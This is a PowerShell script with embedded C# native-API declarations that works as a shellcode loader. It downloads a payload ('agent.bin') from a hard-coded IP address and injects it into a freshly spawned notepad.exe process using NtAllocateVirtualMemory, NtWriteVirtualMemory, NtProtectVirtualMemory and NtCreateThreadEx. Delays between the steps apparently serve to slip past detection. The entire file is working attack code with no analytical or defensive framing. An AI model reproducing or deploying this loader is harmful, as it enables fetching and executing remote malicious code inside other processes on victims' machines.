Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Net;
    using System.Diagnostics;

    public class NtDll {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Argument, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr Timeout);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int ZwSetTimerResolution(uint RequestedResolution, bool Set, ref uint ActualResolution);
    }

    public class MyFunctions {
        private static bool once = true;

        public static void SleepShort(float milliseconds) {
            if (once) {
                uint actualResolution = 0;
                NtDll.ZwSetTimerResolution(1, true, ref actualResolution);
                once = false;
            }

            long interval = (long)(-1 * milliseconds * 10000.0f);
            NtDll.NtDelayExecution(false, ref interval);
        }
    }
"@

# Define URL to download shellcode from
$url = "http://10.100.102.67/agent.bin"

# Function to download shellcode from URL
function Download-Shellcode {
    param($url)
    $webClient = New-Object System.Net.WebClient
    $bytes = $webClient.DownloadData($url)
    return $bytes
}

# Ensure enough delay between operations
[MyFunctions]::SleepShort(2000)

# Download shellcode from URL
$shellcode = Download-Shellcode -url $url

# Calculate the size of the shellcode
$size = $shellcode.Length

# Sleep function for delay
function SleepShort($milliseconds) {
    [MyFunctions]::SleepShort($milliseconds)
}

# Ensure enough delay between operations
SleepShort 2000

# Create new notepad.exe process
$processInfo = Start-Process notepad -PassThru
$processHandle = $processInfo.Handle

SleepShort 2000

# Allocate read-write memory in notepad process using NtAllocateVirtualMemory
$addr = [IntPtr]::Zero
[NtDll]::NtAllocateVirtualMemory($processHandle, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x4)  # AllocationType = MEM_COMMIT, Protect = PAGE_READWRITE

SleepShort 2000

# Write the shellcode to the allocated memory in notepad process
$bytesWritten = 0
[NtDll]::NtWriteVirtualMemory($processHandle, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)

SleepShort 2000

# Change the memory protection to read-execute using NtProtectVirtualMemory
$oldProtect = 0
[NtDll]::NtProtectVirtualMemory($processHandle, [ref]$addr, [ref]$size, 0x20, [ref]$oldProtect)  # NewProtect = PAGE_EXECUTE_READ

SleepShort 2000

# Create a new thread in notepad process and execute the shellcode using NtCreateThreadEx
$thandle = [IntPtr]::Zero
[NtDll]::NtCreateThreadEx([ref]$thandle, 0x1FFFFF, [IntPtr]::Zero, $processHandle, $addr, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)

# Wait for the thread to finish using NtWaitForSingleObject
[NtDll]::NtWaitForSingleObject($thandle, $false, [IntPtr]::Zero)

SleepShort 10000

# Free the allocated memory using NtFreeVirtualMemory
[NtDll]::NtFreeVirtualMemory($processHandle, [ref]$addr, [ref]$size, 0x8000)  # FreeType = MEM_RELEASE
